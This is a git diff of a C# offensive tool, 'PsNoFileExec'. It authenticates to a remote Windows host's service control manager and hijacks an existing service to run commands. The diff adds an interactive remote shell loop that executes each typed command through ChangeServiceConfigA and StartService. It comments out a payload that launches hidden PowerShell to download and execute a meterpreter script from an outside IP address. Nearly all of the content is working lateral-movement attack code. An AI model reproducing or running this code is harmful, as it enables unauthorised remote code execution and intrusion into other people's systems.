@@ -31,7 +31,13 @@ namespace PsNoFileExec
         static void Main(string[] args)
         {
 
-            string target = args[0];
+           string target = args[0];
+           string ServiceName = args[1];
+           int interactive = int.Parse(args[2]);
+            
+
+
+
             //Authenticate to remote host and access to DCE/RPC interface with SC_MANAGER_ALL_ACCESS:
             IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
             if (SCMHandle == IntPtr.Zero)
@@ -44,7 +50,7 @@ namespace PsNoFileExec
             Console.WriteLine("Managed to authenticate to target host");
 
             //Once we have access, try to open an existing service with SERVCE_ALL_ACCESS:
-            string ServiceName = args[1];
+            
             IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
 
             if (schService == IntPtr.Zero)
@@ -54,12 +60,47 @@ namespace PsNoFileExec
                 return;
             }
 
+            
             Console.WriteLine("Successfully opened the existing service.");
 
 
+
+            //Try to create a wrapper for an interactive shell here:
+            if (interactive != 0)
+            {
+                string ipayload = null ;
+                bool Result;
+                int error;
+                Console.WriteLine("[^] Interactive shell selected");
+                Console.ForegroundColor = ConsoleColor.White;
+                Console.ForegroundColor = ConsoleColor.Green;
+                while (ipayload != "exit")
+                {
+                    
+                    Console.Write("Shell> ");
+                    ipayload = Console.ReadLine();
+                    ChangeServiceConfigA(schService, 0xffffffff, 3, 0, ipayload, null, null, null, null, null, null);
+                    Result = StartService(schService, 0, null);
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine(error);
+                    if (error == 1053)
+                    {
+                        Console.WriteLine("[^]Command executed");
+
+                    }
+
+                }
+            }
+
+           
+
+            //Legacy code.
+
+            /*
+
             //use ChangeServiceConfig to allow us to edit our service specified earlier.
             //Use powershell to download our meterpreter payload and execute in memory.
-            string payload = "C:\\windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.45.157/test.ps1')";
+            string payload = "C:\\windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.45.164/test.ps1')";
             
             bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
 
@@ -95,7 +136,7 @@ namespace PsNoFileExec
             SCMHandle = IntPtr.Zero;
 
             Console.WriteLine("SCM handle released.");
-
+            */
             
         }
     }
